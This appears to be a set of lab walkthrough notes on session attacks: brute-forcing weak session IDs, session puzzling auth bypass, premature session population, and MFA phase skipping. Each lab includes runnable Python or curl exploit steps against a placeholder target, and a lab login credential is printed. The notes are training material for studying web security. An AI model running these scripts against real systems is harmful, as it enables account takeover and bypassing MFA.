# Session Attacks

Four labs covering different ways session handling breaks down: weak IDs, fixation, premature population, and phase-skipping in multi-step flows.

---

## Lab 1 — Weak Session IDs (Brute Force)

### What's Happening

The app generates session IDs that aren't random enough. Instead of a cryptographically secure token, the ID is a short alphanumeric value or a predictable pattern.

### Attack

1. Log in once to get a valid session ID. Note its structure (length, character set).
2. Write a brute-forcer that iterates over all possible values matching that pattern.

```python
import requests
import string
import itertools

TARGET = "http://TARGET"
# Example: 4-character alphanumeric session IDs
CHARS = string.ascii_lowercase + string.digits

for combo in itertools.product(CHARS, repeat=4):
    sid = "".join(combo)
    r = requests.get(f"{TARGET}/profile.php",
                     cookies={"sessionID": sid})
    if "Welcome" in r.text or "profile" in r.text.lower():
        print(f"[+] Valid session: {sid}")
        print(r.text[:200])
        break
```

Or if the session ID is integer-based, just loop through numbers:

```python
for i in range(1, 100000):
    r = requests.get(f"{TARGET}/profile.php",
                     cookies={"sessionID": f"b2sx{i}"})
    if r.status_code == 200 and "flag" in r.text.lower():
        print(f"[+] sid={i}: {r.text[:200]}")
```

### Key Points

- Always check session ID length and entropy before assuming it's secure
- Short IDs (≤8 chars) with limited character sets are often brute-forceable
- Check if the ID is sequential (user 1 → ID 1, user 2 → ID 2)

---

## Lab 2 — Session Puzzling: Auth Bypass

### What's Happening

Multi-step registration/login flows often reuse the same session variable for different purposes. If you can reach a "logged in" check via an unexpected path, the session variable may already be set from a previous step.

### The Bug

The app's `login.php` sets `$_SESSION['Username']` during step 1 of a two-step login. The `profile.php` page only checks `isset($_SESSION['Username'])`.

If you go through the first step of registration (which also sets `$_SESSION['Username']`), you can then access `profile.php` directly without completing authentication.

### Exploit

1. Hit the registration endpoint step 1 — just set a username (no password required yet):
```bash
curl -s -c /tmp/sess.txt -X POST http://TARGET/register_1.php \
  -d "username=attacker"
```

2. Immediately access the protected page with that session:
```bash
curl -s -b /tmp/sess.txt http://TARGET/profile.php
```

The `$_SESSION['Username']` is set from step 1, so the profile page lets you in.

---

## Lab 3 — Session Puzzling: Premature Population

### What's Happening

The app sets session state for a user *before* fully authenticating them. If you can trigger the "success" branch of authentication without providing valid credentials, you get the session state of the last user who successfully authenticated.

### The Bug

`login.php` sets `$_SESSION['Username']` for admin on first visit (or as a setup step), then checks credentials. If authentication fails, the session isn't cleared — it's just not redirected to success. But if you know there's a `?success=1` path that reads the session, you can get the admin's session.

### Exploit

1. Visit login as admin (this pre-populates the session):
```bash
curl -s -c /tmp/sess.txt http://TARGET/login.php?user=admin
```

2. Access the success path directly:
```bash
curl -s -b /tmp/sess.txt "http://TARGET/profile.php?success=1"
```

The session already has `Username=admin` from step 1, so step 2 shows the admin panel.

---

## Lab 4 — Session Puzzling: Phase Skipping (MFA Bypass)

### What's Happening

Multi-factor login flows use a `Phase` variable in the session to track which step the user is on. If you can set `Phase=3` (the post-MFA phase) without going through Phase 2, you skip MFA entirely.

### The Bug

The registration flow and the login flow both use `$_SESSION['Phase']`. If you start a login as admin (Phase=1), then switch to registration step 2 (which sets Phase=3 because it's the final registration step), you've skipped the MFA check.

### Exploit

```python
import requests

TARGET = "http://TARGET"
s = requests.Session()

# Step 1: Start login as admin (sets Phase=1, Username=admin)
s.post(f"{TARGET}/login.php", data={"username": "admin", "password": "wrong"})

# Step 2: Hit registration step 2 (sets Phase=3)
s.post(f"{TARGET}/register_2.php", data={"code": "dummy"})

# Step 3: Go to profile — Phase=3, Username=admin → you're in
r = s.get(f"{TARGET}/profile.php")
print(r.text[:300])
```

---

## HTTP Misconfigurations — Easy Skills Assessment

### Overview

The easy skills assessment chains session puzzling between the login flow and the admin area.

### What's Happening

The `/reset_1.php` endpoint (used for password reset step 1) sets `$_SESSION['Username']` for whatever username you provide. The admin user management page at `/admin_users.php` only checks `isset($_SESSION['Username'])` — it doesn't check if you're actually the admin.

### Exploit

1. Login as the student account to get a session:
```bash
curl -s -c /tmp/sess.txt -X POST http://TARGET/login.php \
  -d "username=htb-stdnt&password=Academy_student!"
```

2. Trigger password reset step 1 for admin (overwrites `$_SESSION['Username']` with "admin"):
```bash
curl -s -b /tmp/sess.txt -c /tmp/sess.txt -X POST http://TARGET/reset_1.php \
  -d "username=admin"
```

3. Access the admin user management page:
```bash
curl -s -b /tmp/sess.txt http://TARGET/admin_users.php
```

The session now has `Username=admin` from step 2, and `admin_users.php` grants access.
